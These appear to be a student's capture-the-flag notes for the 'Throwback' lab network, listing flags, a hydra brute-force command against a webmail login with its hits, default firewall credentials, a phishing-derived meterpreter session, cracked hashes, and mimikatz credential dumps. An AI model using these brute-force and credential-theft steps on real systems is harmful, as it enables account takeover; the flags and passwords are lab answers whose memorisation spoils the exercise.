### Throwback Network ###

flag on guest inbox: TBH{ede543c628d365ab772078b0f6880677}
flag in guest contacts page: TBH{ede543c628d365ab772078b0f6880677}
root flag on THROWBACK-FW01:

Enumeration:

port 80 running IIS
Throwback-prod list of employees:
summers winters
jeff davies
hugh gongo
rikka foxx

Contact details:
Great Britain
Phone: +00 151515
Email: hello@TBHSecurity.com

````

Throwback-mail:
10.200.77.232
running squirrel mail
tbhguest:WelcomeTBH1!

using hydra, we got these credential hits:
hydra -L usernames.txt -P passwords.txt  10.200.77.232 http-post-form '/src/redirect.php:login_username=^USER^&secretkey=^PASS^:F=incorrect' -v

````
[80][http-post-form] host: 10.200.77.232   login: JeffersD   password: Summer2020
[STATUS] 53.17 tries/min, 638 tries in 00:12h, 562 to do in 00:11h, 16 active
[STATUS] 51.65 tries/min, 878 tries in 00:17h, 322 to do in 00:07h, 16 active
[VERBOSE] Page redirected to http://10.200.77.232/src/webmail.php
[80][http-post-form] host: 10.200.77.232   login: HumphreyW   password: securitycenter
[VERBOSE] Page redirected to http://10.200.77.232/src/webmail.php
[80][http-post-form] host: 10.200.77.232   login: PeanutbutterM   password: Summer2020
[VERBOSE] Page redirected to http://10.200.77.232/src/webmail.php
[80][http-post-form] host: 10.200.77.232   login: DaviesJ   password: Management2018
[VERBOSE] Page redirected to http://10.200.77.232/src/webmail.php
[80][http-post-form] host: 10.200.77.232   login: GongoH   password: Summer2020
[VERBOSE] Page redirected to http://10.200.77.232/src/webmail.php
[80][http-post-form] host: 10.200.77.232   login: MurphyF   password: Summer2020
[STATUS] attack finished for 10.200.77.232 (waiting for children to complete tests)

````

Logging in with 'DaviesJ' we found a 'shell.exe' file.
Logging in with 'MurphyF' we found:

http://timekeep.throwback.local/dev/passwordreset.php?user=murphyf&password=PASSWORD

```
throwback-fw01:
in default config
admin:pfsense

/var/log/login.log
# cat /var/log/login.log
Last Login 8/9/2020 15:51 -- HumphreyW:1c13639dba96c7b53d26f7d00956a364


flag.txt: TBH{c9cf8b688a9b8677a4546781527e4484}
root flag: TBH{b6f17a9c06e75ea4a09b79e8d89f9749}

-----------------------------------------------------------

with the phishing email composed and sent, we catch 

meterpreter > getuid
Server username: THROWBACK-WS01\BlaireJ
meterpreter > 

user flag: TBH{9c5e361a2368723e042924180be7c958}
root flag: TBH{9c5e361a2368723e042924180be7c958}

-----------------------------------------------------------
using hashcat to crack our hashes

1c13639dba96c7b53d26f7d00956a364

cracked hash: securitycenter

PetersJ::THROWBACK:83d3e94160875c54:45C7B67ECB07DEE5C1E1C6214E448FB7:0101000000000000C0653150DE09D2017B430EFECF9FE1B8000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D201060004000200000008003000300000000000000000000000002000003A036FA605C83CEAF5BEA2891C0417E9E11BC5316FDB3194C736D953EDE18CB00A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00350030002E00320032002E0035000000000000000000

cracked hash: 
Throwback317

-----------------------------------------------------------

THROWBACK-PROD:
ssh PetersJ@10.200.77.219
with password Throwback317

Flag from the poisoned user:
TBH{277c5929d176569338ce0cff02f328c0}

with starkiller we harvest the credential store and find:

We find blairej's flag: TBH{9b56df4dc5cbda864a246ebfe49646c}

and the root flag:TBH{4d6945c0b80283b875fc7c3a5a057da6}

also found admin-petersj:password
SinonFTW123!

using mimikatz to dump passwords, we get blairej's login

BlaireJ cleartext: 7eQgx6YzxgG3vC45t5k9
NTLM hash: c374ecb7c2ccac1df3a82bce4f80bb5b

Administrators NTLM hash: a06e58d15a2585235d18598788b8147a

-----------------------------------------------------------












-----------------------------------------------------------










-----------------------------------------------------------









-----------------------------------------------------------









-----------------------------------------------------------










-----------------------------------------------------------





-----------------------------------------------------------


